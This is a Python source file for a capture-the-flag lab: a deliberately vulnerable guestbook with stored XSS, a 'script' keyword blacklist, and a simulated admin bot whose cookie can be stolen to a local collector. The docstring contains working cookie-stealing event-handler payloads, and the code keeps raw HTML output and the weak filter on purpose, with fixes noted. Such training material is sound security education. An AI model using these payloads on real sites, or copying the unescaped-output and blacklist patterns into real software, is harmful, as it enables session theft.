#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Challenge 06 — Stored XSS + keyword-filter bypass (steal the admin cookie) · Hard · 250 pts
==========================================================================================
Guestbook comments are stored and rendered raw for every viewer. A blacklist rejects any
comment containing the word "script" (any case). Event handlers are not blocked:
  <img src=x onerror=fetch('/collect?c='+document.cookie)>
  <svg onload=fetch('/collect?c='+document.cookie)>

Then press "Ask admin to review" (POST /admin/visit). The admin bot opens the guestbook with
its cookie  admin_session=<FLAG>.  Its "browser" is SIMULATED in-process: it fires
auto-triggering event handlers (onerror/onload/onfocus+autofocus/ontoggle/...) whose code
reads the cookie and sends it to /collect. The stolen cookie shows up in /collector.
No real browser, no outbound requests — "exfiltration" stays on 127.0.0.1.

Run:  python3 app.py
"""
import os, sys, re, secrets, threading, time, urllib.parse, html
from html.parser import HTMLParser
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import common

CID = "xss_hard"
C = common.CHALLENGE_BY_ID[CID]
FLAG = C["flag"]
ADMIN_COOKIE = f"admin_session={FLAG}"

LOCK = threading.Lock()
SEED = [
    {"name": "Mona",  "text": "Great service, the staff were lovely!"},
    {"name": "Karim", "text": "Booked again for next summer :)"},
]
COMMENTS = list(SEED)
COLLECTED = []   # what the "attacker's server" (/collect) received

# Handlers a headless admin browser would fire with no user interaction.
AUTO_EVENTS = {"onerror", "onload", "onpageshow", "ontoggle", "onanimationstart",
               "onanimationend", "ontransitionend", "onbegin", "onfocus", "onfocusin"}


# ======= VULN HERE (filter) =======
# A keyword BLACKLIST. It blocks <script> but not the dozens of other ways to run JS
# (event handlers, javascript: is caught only because it contains "script").
# Fix: don't blacklist — HTML-encode on output (html.escape), or sanitise with an allow-list,
#      mark the session cookie HttpOnly, and send a CSP.
def waf_blocks(text):
    return re.search(r"script", text, re.I) is not None
# ==================================


class _BotParser(HTMLParser):
    """Very small 'browser': finds auto-firing event handlers in the rendered comments."""
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.scripts = []

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        for name, code in a.items():
            if name not in AUTO_EVENTS:
                continue
            if name in ("onfocus", "onfocusin") and "autofocus" not in a:
                continue          # focus handlers need autofocus to fire on their own
            if name == "ontoggle" and "open" not in a:
                continue
            self.scripts.append(code)

    handle_startendtag = handle_starttag


def admin_bot_visit():
    """Simulate the admin opening the guestbook. Returns how many payloads fired / exfiltrated."""
    with LOCK:
        page = "".join(c["text"] for c in COMMENTS)
    p = _BotParser()
    p.feed(page)
    fired, stolen = len(p.scripts), 0
    for code in p.scripts:
        # the handler "runs" in the admin's browser: does it read the cookie and send it home?
        if re.search(r"cookie", code, re.I) and "/collect" in code:
            with LOCK:
                COLLECTED.append({"time": time.strftime("%H:%M:%S"), "from": "admin-bot (127.0.0.1)",
                                  "c": ADMIN_COOKIE})
            stolen += 1
    return fired, stolen


class Handler(common.CTFHandler):
    CHALLENGE_ID = CID

    def guest_cookie(self):
        return self.cookies().get("session")

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(u.query, keep_blank_values=True)
        if u.path == "/":
            self.guestbook(qs.get("result", [None])[0], qs.get("msg", [""])[0])
            return
        if u.path == "/collect":
            # the "attacker-controlled" collector — logs whatever it is sent
            c = qs.get("c", [""])[0]
            with LOCK:
                COLLECTED.append({"time": time.strftime("%H:%M:%S"),
                                  "from": "browser " + self.address_string(), "c": c})
            common.send_raw(self, b"ok", "text/plain", extra_headers=[("Access-Control-Allow-Origin", "*")])
            return
        if u.path == "/collector":
            self.collector_page()
            return
        self.send_html(common.render("<p>404</p>", C["title"], self.challenge), 404)

    def do_POST(self):
        if self.path == "/submit":
            self.handle_flag_submit()
            return
        if self.path == "/comment":
            data = common.parse_form(self)
            name = data.get("name", "").strip()[:40] or "anonymous"
            text = data.get("comment", "")[:2000]
            if waf_blocks(name) or waf_blocks(text):
                self.redirect("/?msg=" + urllib.parse.quote("blocked"))
                return
            with LOCK:
                COMMENTS.append({"name": name, "text": text})
            self.redirect("/?msg=" + urllib.parse.quote("posted"))
            return
        if self.path == "/admin/visit":
            fired, stolen = admin_bot_visit()
            self.redirect("/?msg=" + urllib.parse.quote(f"visited:{fired}:{stolen}"))
            return
        if self.path == "/reset":
            with LOCK:
                COMMENTS[:] = list(SEED)
                COLLECTED.clear()
            self.redirect("/?msg=reset")
            return
        self.send_html(common.render("<p>404</p>", C["title"], self.challenge), 404)

    def guestbook(self, result=None, msg=""):
        extra = []
        if not self.guest_cookie():
            extra.append(("Set-Cookie", f"session=guest_{secrets.token_hex(6)}; Path=/"))

        note = ""
        if msg == "blocked":
            note = "<p class='bad'>🛑 Blocked by security filter: forbidden keyword detected.</p>"
        elif msg == "posted":
            note = "<p class='ok'>Comment posted.</p>"
        elif msg == "reset":
            note = "<p class='ok'>Guestbook and collector reset.</p>"
        elif msg.startswith("visited:"):
            _, fired, stolen = msg.split(":")
            note = (f"<p class='warn'>🤖 The admin reviewed the guestbook. Event handlers that fired in "
                    f"the admin's browser: <b>{html.escape(fired)}</b>; requests to /collect carrying "
                    f"the cookie: <b>{html.escape(stolen)}</b>. Check the <a href='/collector'>collector</a>.</p>")

        with LOCK:
            items = list(COMMENTS)
        rows = ""
        for c in items:
            # ======= VULN HERE (output) =======
            # The comment body is written into the page raw -> stored XSS for every viewer.
            # Fix: {html.escape(c['text'])}
            rows += (f"<div class='row' style='display:block'><b>{html.escape(c['name'])}</b>"
                     f"<div>{c['text']}</div></div>")
            # ===================================

        body = f"""
        <h2>Sunset Hotel — Guestbook</h2>
        {note}
        {rows}
        <h3 style="margin-top:22px">Leave a comment</h3>
        <form method="POST" action="/comment">
          <input name="name" placeholder="Your name" autocomplete="off">
          <textarea name="comment" rows="3" placeholder="Your comment (HTML allowed for formatting)"></textarea>
          <button type="submit">Post</button>
        </form>
        <form method="POST" action="/admin/visit" style="display:inline">
          <button type="submit" style="background:#7c3aed">🤖 Ask admin to review</button>
        </form>
        <form method="POST" action="/reset" style="display:inline">
          <button type="submit" style="background:#374151">Reset</button>
        </form>
        <p class="note">Your exfiltration endpoint (simulated attacker server):
           <code>/collect?c=...</code> — received data appears at <a href="/collector">/collector</a>.
           The admin's browser is a simulated bot; it runs event-handler payloads that fire on page load.</p>"""
        self.send_html(common.render(body, C["title"], self.challenge, result), extra_headers=extra)

    def collector_page(self):
        with LOCK:
            items = list(reversed(COLLECTED))
        rows = "".join(
            f"<div class='row'><span>{html.escape(i['time'])} · {html.escape(i['from'])}</span>"
            f"<code>{html.escape(i['c'])}</code></div>" for i in items) or "<p class='note'>Nothing received yet.</p>"
        flag = (f"<div class='flag'>🚩 Admin cookie stolen: {html.escape(FLAG)}</div>"
                if any(FLAG in i["c"] for i in items) else "")
        body = f"""
        <h2>📥 Collector (attacker's server)</h2>
        {flag}
        {rows}
        <p><a href="/collector">Refresh</a> &nbsp;·&nbsp; <a href="/">Back to guestbook</a></p>"""
        self.send_html(common.render(body, C["title"], self.challenge))


if __name__ == "__main__":
    common.serve(C, Handler)
